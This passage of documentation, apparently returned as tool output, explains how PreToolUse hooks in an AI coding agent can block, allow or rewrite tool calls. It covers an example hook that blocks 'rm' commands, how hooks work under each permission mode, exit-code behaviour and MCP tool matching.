    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          {
            "type": "command",
            "if": "Bash(rm *)",
            "command": "${CLAUDE_PROJECT_DIR}/.claude/hooks/block-rm.sh"
          }
        ]
      }
    ]
  }
}
```

## Modifying Tool Input

Use `updatedInput` to rewrite a tool's arguments before execution:

```json
{
  "hookSpecificOutput": {
    "hookEventName": "PreToolUse",
    "permissionDecision": "allow",
    "updatedInput": {
      "command": "npm run lint -- --fix"
    }
  }
}
```

## Interaction with Permission Modes

- **`default` mode**: Hook decisions are processed; unspecified (`defer`) defers to user
- **`auto` mode**: Hook `allow` approves without asking; hook `deny` blocks immediately
- **`bypassPermissions` mode**: Permissions are skipped entirely; hooks still run
- **`dontAsk` mode**: Approves by default; hook `deny` still blocks

## Exit Code Behavior

| Exit Code | Result |
|-----------|--------|
| `0` with JSON | Processes `hookSpecificOutput` decision |
| `0` without JSON | Defers to normal permission flow |
| `2` | Blocks the tool call (equivalent to `"deny"`) |
| Other | Non-blocking error; execution continues |

## MCP Tool Matching

MCP tools follow the naming pattern `mcp__<server>__<tool>`:

```json
{
  "matcher": "mcp__memory__.*",      // All memory server tools
  "matcher": "mcp__.*__write.*"      // All write tools from any server
}
```

## Best Practices

1. **Use `if` conditions** to narrow scope and avoid unnecessary spawns:
   ```json
   { "if": "Bash(rm *)" }  // Only runs for rm commands
   ```

2. **Return `defer`** when you can't decide rather than always denying

3. **Provide clear reasons** in `permissionDecisionReason` for blocked calls

4. **Modify input cautiously**—rewriting inputs can hide user intent from Claude

5. **Keep hooks fast**—they run before every tool call
```
</details></tool-use>
